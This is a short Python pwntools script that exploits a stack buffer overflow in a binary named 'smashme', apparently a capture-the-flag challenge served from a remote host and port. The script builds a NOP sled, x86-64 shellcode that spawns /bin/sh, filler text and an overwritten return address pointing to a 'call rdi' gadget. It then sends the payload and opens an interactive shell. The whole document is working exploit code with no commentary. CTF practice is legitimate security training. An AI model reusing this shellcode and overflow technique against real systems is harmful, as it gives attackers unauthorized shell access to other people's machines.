from pwn import *

local = 0

def attack():
  call_rdi = 0x40071a
  shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
  string = "Smash me outside, how bout dAAAAAAAAAAA"
  buf = "\x90"*(72 - len(shellcode) - len(string)) + shellcode + string + p64(call_rdi)
  if local:
    p = process('./smashme')
  else:
    p = remote('lox.xvm.mit.edu', 23002)
  print p.recvline()
  p.sendline(buf)
  p.interactive()

if __name__ == '__main__':
  attack()
